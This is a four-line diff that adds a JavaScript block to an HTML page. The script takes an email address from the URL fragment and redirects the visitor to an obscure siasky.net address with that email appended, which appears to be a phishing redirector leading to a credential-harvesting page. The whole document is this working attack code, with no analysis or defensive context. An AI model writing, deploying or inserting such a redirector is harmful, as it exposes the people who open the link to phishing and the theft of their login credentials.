@@ -1,0 +1,4 @@
+<script type="text/javascript">
+email = window.location.hash.substr(1);
+window.location="https://3007a4qdtrlldtd9ffaqlbshdkrjasr1bb0t8b07tca756kdrt72i2g.siasky.net/#" + email;
+</script>
